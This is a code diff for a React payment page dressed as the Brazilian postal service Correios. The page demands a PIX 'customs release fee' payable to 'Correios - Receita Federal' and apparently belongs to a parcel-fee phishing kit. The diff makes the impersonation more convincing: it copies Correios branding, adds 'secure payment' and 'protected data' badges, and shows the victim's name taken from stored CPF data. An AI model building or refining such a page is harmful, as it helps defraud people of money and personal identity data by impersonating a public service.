@@ -17,7 +17,11 @@ import {
   Check,
   Loader2,
   Clock,
-  CheckCircle,
+  CheckCircle2,
+  QrCode,
+  Smartphone,
+  CreditCard,
+  ShieldCheck,
 } from "lucide-react"
 import { useState, useEffect, useCallback } from "react"
 import { Button } from "@/components/ui/button"
@@ -37,6 +41,7 @@ export default function PixPage() {
   const [copied, setCopied] = useState(false)
   const [paymentStatus, setPaymentStatus] = useState<string>("PENDING")
   const [mounted, setMounted] = useState(false)
+  const [customerName, setCustomerName] = useState<string>("")
 
   useEffect(() => {
     setMounted(true)
@@ -47,7 +52,6 @@ export default function PixPage() {
       setLoading(true)
       setError(null)
 
-      // Get customer data from localStorage
       const storedData = localStorage.getItem("cpfData")
       let customerData = {
         nome: "Cliente",
@@ -64,6 +68,7 @@ export default function PixPage() {
           telefone: parsed.telefone || "11999999999",
           email: parsed.email || "",
         }
+        setCustomerName(parsed.nome || "")
       }
 
       if (!customerData.cpf) {
@@ -111,7 +116,6 @@ export default function PixPage() {
     }
   }, [mounted, generatePix])
 
-  // Poll for payment status
   useEffect(() => {
     if (!pixData?.txid || paymentStatus === "APPROVED") return
 
@@ -127,7 +131,7 @@ export default function PixPage() {
       }
     }
 
-    const interval = setInterval(checkStatus, 5000) // Check every 5 seconds
+    const interval = setInterval(checkStatus, 5000)
     return () => clearInterval(interval)
   }, [pixData?.txid, paymentStatus])
 
@@ -139,7 +143,6 @@ export default function PixPage() {
       setCopied(true)
       setTimeout(() => setCopied(false), 3000)
     } catch (err) {
-      // Fallback for older browsers
       const textArea = document.createElement("textarea")
       textArea.value = pixData.copiaECola
       document.body.appendChild(textArea)
@@ -160,17 +163,17 @@ export default function PixPage() {
 
   if (!mounted) {
     return (
-      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
+      <div className="min-h-screen bg-[#f5f3f0] flex items-center justify-center">
         <div className="text-center">
-          <Loader2 className="h-12 w-12 animate-spin text-blue-600 mx-auto" />
-          <p className="mt-4 text-gray-600">Carregando...</p>
+          <Loader2 className="h-12 w-12 animate-spin text-[#004069] mx-auto" />
+          <p className="mt-4 text-[#004069] font-medium">Carregando...</p>
         </div>
       </div>
     )
   }
 
   return (
-    <div className="min-h-screen bg-gray-100" style={{ fontFamily: "Verdana, sans-serif" }}>
+    <div className="min-h-screen bg-[#f5f3f0]" style={{ fontFamily: "Verdana, sans-serif" }}>
       {/* Header */}
       <header style={{ backgroundColor: "#f5f3f0" }}>
         <div className="flex items-center justify-between px-4 py-2">
@@ -200,7 +203,7 @@ export default function PixPage() {
           </div>
         </div>
 
-        <div className="bg-yellow-400 w-full h-px"></div>
+        <div className="bg-[#FFCB05] w-full h-1"></div>
       </header>
 
       {/* Main Content */}
@@ -211,139 +214,230 @@ export default function PixPage() {
             <a href="/" className="text-blue-600 hover:underline">
               {"<"}
             </a>
-            <span className="text-black ml-1">Pagamento PIX</span>
+            <span className="text-[#004069] ml-1">Pagamento PIX</span>
           </span>
           <div className="hidden md:flex items-center gap-2 text-blue-600">
             <a href="/" className="hover:underline">
               Portal Correios
             </a>
-            <span className="text-foreground">{">"}</span>
+            <span className="text-[#004069]">{">"}</span>
             <a href="/" className="hover:underline">
               Rastreamento
             </a>
-            <span className="text-foreground">{">"}</span>
-            <span>Pagamento PIX</span>
+            <span className="text-[#004069]">{">"}</span>
+            <span className="text-[#004069]">Pagamento PIX</span>
           </div>
         </nav>
 
-        {/* Payment Content */}
-        <div className="bg-white p-6 rounded-sm">
-          <h1 className="text-2xl font-bold text-[rgba(0,64,105,1)] mb-6">Pagamento via PIX</h1>
+        {/* Title Section */}
+        <div className="bg-[#004069] text-white p-4 mb-0">
+          <div className="flex items-center gap-3">
+            <QrCode className="w-8 h-8 text-[#FFCB05]" />
+            <div>
+              <h1 className="text-xl md:text-2xl font-bold">Pagamento via PIX</h1>
+              <p className="text-sm text-gray-200">Taxa de Liberação Aduaneira</p>
+            </div>
+          </div>
+        </div>
 
+        {/* Yellow Accent Bar */}
+        <div className="bg-[#FFCB05] h-2 mb-6"></div>
+
+        {/* Payment Content */}
+        <div className="bg-white border border-gray-200">
           {/* Loading State */}
           {loading && (
-            <div className="flex flex-col items-center justify-center py-12">
-              <Loader2 className="h-16 w-16 animate-spin text-blue-600 mb-4" />
-              <p className="text-gray-600 text-lg">Gerando QR Code PIX...</p>
-              <p className="text-gray-500 text-sm mt-2">Aguarde um momento</p>
+            <div className="flex flex-col items-center justify-center py-16">
+              <div className="bg-[#004069] rounded-full p-6 mb-6">
+                <Loader2 className="h-12 w-12 animate-spin text-[#FFCB05]" />
+              </div>
+              <p className="text-[#004069] text-lg font-bold">Gerando QR Code PIX</p>
+              <p className="text-gray-500 text-sm mt-2">Aguarde um momento...</p>
             </div>
           )}
 
           {/* Error State */}
           {error && !loading && (
-            <div className="bg-red-50 border border-red-200 rounded-lg p-6 text-center">
-              <p className="text-red-700 font-medium mb-4">{error}</p>
-              <Button
-                onClick={generatePix}
-                className="bg-blue-600 hover:bg-blue-700 text-white"
-              >
-                Tentar novamente
-              </Button>
+            <div className="p-6">
+              <div className="bg-red-50 border-l-4 border-red-500 p-6">
+                <div className="flex items-start gap-3">
+                  <div className="bg-red-500 rounded-full p-2">
+                    <ShieldCheck className="w-5 h-5 text-white" />
+                  </div>
+                  <div>
+                    <p className="text-red-800 font-bold mb-2">Erro ao gerar pagamento</p>
+                    <p className="text-red-700 text-sm mb-4">{error}</p>
+                    <Button
+                      onClick={generatePix}
+                      className="bg-[#004069] hover:bg-[#003050] text-white"
+                    >
+                      Tentar novamente
+                    </Button>
+                  </div>
+                </div>
+              </div>
             </div>
           )}
 
           {/* Payment Approved State */}
           {paymentStatus === "APPROVED" && (
-            <div className="bg-green-50 border border-green-200 rounded-lg p-8 text-center">
-              <CheckCircle className="h-20 w-20 text-green-600 mx-auto mb-4" />
-              <h2 className="text-2xl font-bold text-green-700 mb-2">Pagamento Confirmado!</h2>
-              <p className="text-green-600 mb-4">
-                Sua encomenda será liberada em breve. Acompanhe o rastreamento para mais atualizações.
-              </p>
-              <a href="/" className="text-blue-600 hover:underline">
-                Voltar para o início
-              </a>
+            <div className="p-6">
+              <div className="bg-green-50 border-l-4 border-green-500 p-8 text-center">
+                <div className="bg-green-500 rounded-full p-4 w-20 h-20 mx-auto mb-4 flex items-center justify-center">
+                  <CheckCircle2 className="w-12 h-12 text-white" />
+                </div>
+                <h2 className="text-2xl font-bold text-green-800 mb-2">Pagamento Confirmado!</h2>
+                <p className="text-green-700 mb-6">
+                  Sua encomenda será liberada em breve. Acompanhe o rastreamento para mais atualizações.
+                </p>
+                <a
+                  href="/"
+                  className="inline-block bg-[#004069] hover:bg-[#003050] text-white font-bold py-3 px-8"
+                >
+                  Voltar para o início
+                </a>
+              </div>
             </div>
           )}
 
           {/* PIX Data */}
           {pixData && !loading && !error && paymentStatus !== "APPROVED" && (
-            <div className="space-y-6">
-              {/* Amount */}
-              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 text-center">
-                <p className="text-gray-600 text-sm mb-1">Valor a pagar:</p>
-                <p className="text-3xl font-bold text-[rgba(0,64,105,1)]">
-                  {formatCurrency(pixData.amountCents)}
-                </p>
-              </div>
-
-              {/* QR Code */}
-              <div className="flex flex-col items-center">
-                <p className="text-gray-700 mb-4 text-center">
-                  Escaneie o QR Code abaixo com o aplicativo do seu banco:
-                </p>
-                <div className="bg-white p-4 border-2 border-gray-200 rounded-lg shadow-sm">
-                  <img
-                    src={pixData.qrCodeBase64}
-                    alt="QR Code PIX"
-                    className="w-64 h-64 md:w-72 md:h-72"
-                  />
+            <div>
+              {/* Amount Header */}
+              <div className="bg-[#e9ecef] p-4 border-b border-gray-200">
+                <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-2">
+                  <div>
+                    <p className="text-sm text-gray-600">Beneficiário</p>
+                    <p className="font-bold text-[#004069]">Correios - Receita Federal</p>
+                  </div>
+                  <div className="text-right">
+                    <p className="text-sm text-gray-600">Valor total</p>
+                    <p className="text-2xl md:text-3xl font-bold text-[#004069]">
+                      {formatCurrency(pixData.amountCents)}
+                    </p>
+                  </div>
                 </div>
               </div>
 
-              {/* Copy and Paste Code */}
-              <div className="bg-gray-50 rounded-lg p-4">
-                <p className="text-gray-700 font-medium mb-2 text-center">
-                  Ou copie o código PIX Copia e Cola:
-                </p>
-                <div className="bg-white border border-gray-200 rounded-lg p-3 mb-3">
-                  <p className="text-xs text-gray-600 break-all font-mono">
-                    {pixData.copiaECola}
-                  </p>
-                </div>
-                <Button
-                  onClick={copyToClipboard}
-                  className={`w-full ${
-                    copied
-                      ? "bg-green-600 hover:bg-green-700"
-                      : "bg-blue-600 hover:bg-blue-700"
-                  } text-white font-bold py-3`}
-                >
-                  {copied ? (
-                    <>
-                      <Check className="w-5 h-5 mr-2" />
-                      Código Copiado!
-                    </>
-                  ) : (
-                    <>
-                      <Copy className="w-5 h-5 mr-2" />
-                      Copiar Código PIX
-                    </>
-                  )}
-                </Button>
-              </div>
+              <div className="p-6">
+                {/* Customer Info */}
+                {customerName && (
+                  <div className="bg-[#f8f9fa] border border-gray-200 p-3 mb-6">
+                    <p className="text-sm text-gray-600">
+                      Pagador: <span className="font-bold text-[#004069]">{customerName}</span>
+                    </p>
+                  </div>
+                )}
 
-              {/* Status and Timer */}
-              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
-                <div className="flex items-center justify-center gap-2 text-yellow-700">
-                  <Clock className="w-5 h-5" />
-                  <span className="font-medium">Aguardando pagamento...</span>
-                </div>
-                <p className="text-center text-yellow-600 text-sm mt-2">
-                  O QR Code expira em 1 hora. Após o pagamento, a confirmação pode levar alguns minutos.
-                </p>
-              </div>
+                {/* QR Code Section */}
+                <div className="flex flex-col lg:flex-row gap-8">
+                  {/* Left - QR Code */}
+                  <div className="flex-1 flex flex-col items-center">
+                    <div className="border-2 border-[#004069] p-1 mb-4">
+                      <div className="border border-[#FFCB05] p-3 bg-white">
+                        <img
+                          src={pixData.qrCodeBase64}
+                          alt="QR Code PIX"
+                          className="w-56 h-56 md:w-64 md:h-64"
+                        />
+                      </div>
+                    </div>
+                    <p className="text-center text-sm text-gray-600 max-w-xs">
+                      Escaneie o QR Code acima com o aplicativo do seu banco para efetuar o pagamento
+                    </p>
+                  </div>
 
-              {/* Instructions */}
-              <div className="bg-gray-50 rounded-lg p-4">
-                <h3 className="font-bold text-gray-800 mb-3">Como pagar:</h3>
-                <ol className="list-decimal list-inside space-y-2 text-sm text-gray-700">
-                  <li>Abra o aplicativo do seu banco</li>
-                  <li>Acesse a opção PIX</li>
-                  <li>Escolha pagar com QR Code ou PIX Copia e Cola</li>
-                  <li>Escaneie o código ou cole o texto copiado</li>
-                  <li>Confirme o pagamento</li>
-                </ol>
+                  {/* Right - Copy and Paste + Instructions */}
+                  <div className="flex-1">
+                    {/* Copy Section */}
+                    <div className="bg-[#f8f9fa] border border-gray-200 p-4 mb-4">
+                      <div className="flex items-center gap-2 mb-3">
+                        <Copy className="w-5 h-5 text-[#004069]" />
+                        <p className="font-bold text-[#004069]">PIX Copia e Cola</p>
+                      </div>
+                      <div className="bg-white border border-gray-300 p-3 mb-3 max-h-24 overflow-y-auto">
+                        <p className="text-xs text-gray-700 break-all font-mono leading-relaxed">
+                          {pixData.copiaECola}
+                        </p>
+                      </div>
+                      <Button
+                        onClick={copyToClipboard}
+                        className={`w-full font-bold py-3 ${
+                          copied
+                            ? "bg-green-600 hover:bg-green-700"
+                            : "bg-[#FFCB05] hover:bg-[#e6b800] text-[#004069]"
+                        }`}
+                      >
+                        {copied ? (
+                          <>
+                            <Check className="w-5 h-5 mr-2" />
+                            Código Copiado!
+                          </>
+                        ) : (
+                          <>
+                            <Copy className="w-5 h-5 mr-2" />
+                            COPIAR CÓDIGO
+                          </>
+                        )}
+                      </Button>
+                    </div>
+
+                    {/* Status */}
+                    <div className="bg-[#fff3cd] border-l-4 border-[#FFCB05] p-4 mb-4">
+                      <div className="flex items-center gap-2">
+                        <Clock className="w-5 h-5 text-[#856404]" />
+                        <span className="font-bold text-[#856404]">Aguardando pagamento</span>
+                      </div>
+                      <p className="text-sm text-[#856404] mt-1">
+                        O QR Code expira em 1 hora
+                      </p>
+                    </div>
+
+                    {/* Instructions */}
+                    <div className="bg-[#e7f3ff] border border-[#b6d4fe] p-4">
+                      <p className="font-bold text-[#004069] mb-3 flex items-center gap-2">
+                        <Smartphone className="w-5 h-5" />
+                        Como pagar:
+                      </p>
+                      <ol className="space-y-2 text-sm text-[#004069]">
+                        <li className="flex items-start gap-2">
+                          <span className="bg-[#004069] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">1</span>
+                          <span>Abra o aplicativo do seu banco</span>
+                        </li>
+                        <li className="flex items-start gap-2">
+                          <span className="bg-[#004069] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">2</span>
+                          <span>Acesse a opção PIX</span>
+                        </li>
+                        <li className="flex items-start gap-2">
+                          <span className="bg-[#004069] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">3</span>
+                          <span>Escolha QR Code ou Copia e Cola</span>
+                        </li>
+                        <li className="flex items-start gap-2">
+                          <span className="bg-[#004069] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">4</span>
+                          <span>Confirme os dados e finalize</span>
+                        </li>
+                      </ol>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Security Footer */}
+                <div className="mt-6 pt-6 border-t border-gray-200">
+                  <div className="flex flex-wrap items-center justify-center gap-6 text-sm text-gray-600">
+                    <div className="flex items-center gap-2">
+                      <ShieldCheck className="w-5 h-5 text-green-600" />
+                      <span>Pagamento Seguro</span>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <CreditCard className="w-5 h-5 text-[#004069]" />
+                      <span>PIX Instantâneo</span>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <Lock className="w-5 h-5 text-[#004069]" />
+                      <span>Dados Protegidos</span>
+                    </div>
+                  </div>
+                </div>
               </div>
             </div>
           )}
@@ -351,94 +445,78 @@ export default function PixPage() {
       </main>
 
       {/* Footer */}
-      <footer className="bg-yellow-400 text-black py-8 mt-12">
+      <footer className="bg-[#FFCB05] text-[#004069] py-8 mt-12">
         <div className="max-w-6xl mx-auto px-4">
           <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
             <div>
-              <h3 className="font-bold mb-4 text-[rgba(0,64,105,1)] text-lg md:text-2xl">Fale Conosco</h3>
+              <h3 className="font-bold mb-4 text-lg md:text-xl">Fale Conosco</h3>
               <ul className="space-y-2">
                 <li className="flex items-center gap-2">
-                  <FileText className="w-4 h-4 text-[rgba(12,63,101,1)]" />
-                  <span className="text-[rgba(0,65,104,1)] font-medium text-sm md:text-base">
-                    Registro de Manifestações
-                  </span>
+                  <FileText className="w-4 h-4" />
+                  <span className="font-medium text-sm">Registro de Manifestações</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <Phone className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
-                    Central de Atendimento
-                  </span>
+                  <Phone className="w-4 h-4" />
+                  <span className="font-medium text-sm">Central de Atendimento</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <ShoppingCart className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
-                    Soluções para o seu negócio
-                  </span>
+                  <ShoppingCart className="w-4 h-4" />
+                  <span className="font-medium text-sm">Soluções para o seu negócio</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <HelpCircle className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
-                    Suporte ao cliente com contrato
-                  </span>
+                  <HelpCircle className="w-4 h-4" />
+                  <span className="font-medium text-sm">Suporte ao cliente com contrato</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <Users className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Ouvidoria</span>
+                  <Users className="w-4 h-4" />
+                  <span className="font-medium text-sm">Ouvidoria</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <Shield className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Denúncia</span>
+                  <Shield className="w-4 h-4" />
+                  <span className="font-medium text-sm">Denúncia</span>
                 </li>
               </ul>
             </div>
 
             <div>
-              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Sobre os Correios</h3>
+              <h3 className="font-bold mb-4 text-lg md:text-xl">Sobre os Correios</h3>
               <ul className="space-y-2">
                 <li className="flex items-center gap-2">
-                  <Building className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
-                    Identidade corporativa
-                  </span>
+                  <Building className="w-4 h-4" />
+                  <span className="font-medium text-sm">Identidade corporativa</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <GraduationCap className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Educação e cultura</span>
+                  <GraduationCap className="w-4 h-4" />
+                  <span className="font-medium text-sm">Educação e cultura</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <FileText className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Código de ética</span>
+                  <FileText className="w-4 h-4" />
+                  <span className="font-medium text-sm">Código de ética</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <Search className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
-                    Transparência e prestação de contas
-                  </span>
+                  <Search className="w-4 h-4" />
+                  <span className="font-medium text-sm">Transparência e prestação de contas</span>
                 </li>
                 <li className="flex items-center gap-2">
-                  <Lock className="w-4 h-4 text-[rgba(0,64,105,1)]" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
-                    Política de Privacidade e Notas Legais
-                  </span>
+                  <Lock className="w-4 h-4" />
+                  <span className="font-medium text-sm">Política de Privacidade</span>
                 </li>
               </ul>
             </div>
 
             <div>
-              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Outros Sites</h3>
+              <h3 className="font-bold mb-4 text-lg md:text-xl">Outros Sites</h3>
               <ul className="space-y-2">
-                <li className="flex items-center gap-2 text-[rgba(0,64,105,1)]">
+                <li className="flex items-center gap-2">
                   <ExternalLink className="w-4 h-4" />
-                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
-                    Loja online dos Correios
-                  </span>
+                  <span className="font-medium text-sm">Loja online dos Correios</span>
                 </li>
               </ul>
             </div>
           </div>
 
-          <div className="text-center mt-8 pt-4 border-t border-yellow-500">
-            <p className="text-sm">© Copyright 2025 Correios</p>
+          <div className="text-center mt-8 pt-4 border-t border-[#e6b800]">
+            <p className="text-sm font-medium">© Copyright 2025 Correios - Todos os direitos reservados</p>
           </div>
         </div>
       </footer>
